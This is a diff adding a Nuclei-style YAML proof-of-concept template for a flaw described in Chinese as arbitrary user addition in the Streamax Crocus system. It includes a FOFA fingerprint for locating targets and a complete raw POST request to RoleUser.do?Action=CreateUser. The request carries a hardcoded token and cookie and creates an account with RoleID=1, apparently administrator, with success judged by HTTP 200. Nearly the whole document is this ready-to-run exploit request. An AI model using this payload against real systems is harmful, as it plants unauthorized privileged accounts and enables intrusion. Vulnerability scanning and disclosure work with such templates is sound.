@@ -1,0 +1,42 @@
+id: poc-bk6fy44m8a6ylx1u
+info:
+  name: 锐明Crocus系统存在任意用户添加漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bk6fy44m8a6ylx1u'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bk6fy44m8a6ylx1u
+    fofa: body="inp_verification"
+http:
+- raw:
+  - 'POST /RoleUser.do?Action=CreateUser HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Requested-With: XMLHttpRequest
+
+    Token: d2Vic2VjOjE3MjQwNjk4NzE5NDk=
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: JSESSIONID=5420BDDEB39984240BE700F2E755F2F9; Saffron.U=VUlEPTImVU49d2Vic2VjJkdJRD0xNzI0MDY5ODcxOTQ5MSZSSUQ9MSZNPUJNYXAmSU5TPTE=
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Content-Length: 243
+
+
+    UserID=&RoleID=1&DirName=%E6%A0%B9%E7%9B%AE%E5%BD%95&DirPower=1&GroupPower=1&GroupPowerName=crocus-center(81)&UserName=d2Jz&Password=ed5b11f0310676df5b25b140d8aab20e&ConfirmPassword=ed5b11f0310676df5b25b140d8aab20e&TelPhone=&Email=admin123%40qq.com'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
